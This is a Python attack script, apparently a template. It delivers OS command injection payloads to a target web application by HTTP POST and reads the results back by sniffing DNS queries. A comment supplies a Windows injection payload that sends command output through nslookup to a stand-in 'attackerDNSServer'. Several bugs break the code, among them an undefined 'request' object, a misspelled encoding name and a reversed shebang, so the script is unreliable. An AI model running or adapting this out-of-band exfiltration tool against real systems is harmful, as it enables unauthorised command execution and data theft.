!#/usr/bin/env python
#
#
##
# Description:
# this script executes code on a target via a post request  and target returns the result over DNS query lookups in case of restricted 
# firewall rules , this could be  used in case you found some type of an OS command injection wich was not showing output or errors on the server in
# anyway exept for outofband limited connections like DNS
#
# You need to change things inside the script manualy based on your target and your exploit's requirements
#
#
# you can also create your own authentication methods if needed
#
from scapy.all import *  # this module works like tcpdump for python
from threading import Thread
from time import sleep
from cmd import Cmd
import requests
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup # this module makes parsing HTML easier

class Terminal(Cmd): 
    prompt = '>'
    def __init__(self):
	self.auth = HTTPBasicAuth('user' , 'password') # imagine there is an http basic authentication wich leads to the page executing the commands
	page = requests.get('https://targeturl' , auth=self.auth)
	# now print he page and include the parameters if needed (first make sure your parameters are needed)
	# print(page.text)
	# soup = BeautifulSoup(page.text, 'html.parser')
	# self.param1 = soup.find('input',{'name':'paramName1'})['value'] # aoutomaticaly includes parameters and values after parsing the html
	# self.param2 = soup.find('input',{'name':'paramName2'})['value2']
	# ...
	Cmd.__init__(self)

    def do_cmd(self, args):
	print(args)

    def default(self, args):
	cmd = """breake out of syntax and put your cammond here""" # supose a RCE on a windows box, this should be somthing like this:
								   # & for /f "tokens=1,2,3,4,5,6" %a in ('{args}') do nslookup %a%b%c%d%e%f attackerDNSServer
	data = {
		'paramName1':self.param1,
		'paramName2':self.param2,
		# here you should include the parameter wich sends the command
		# 'param3':cmd,
		# ...
		}
	request.post('https://targeturl', data=data , auth=self.auth)


class Sniffer(Thread):
    def  __init__(self, interface="eth0"): # specify the interface your listening on
         super().__init__()

        self.interface = interface

    def run(self):
        sniff(iface=self.interface, filter="ip", prn=self.print_packet)

    def print_packet(self, packet):
	if (packet.haslayer(DNS)):
		if packet.dport == 53:
		    qname = (packet.qd.qname).decode("utrf-8")
		    qtype = packet.qd.qtype
		    if qtype == 1:
			print(qname)


sniffer = Sniffer()
sniffer.start()
terminal = Terminal()
terminal.cmdloop()

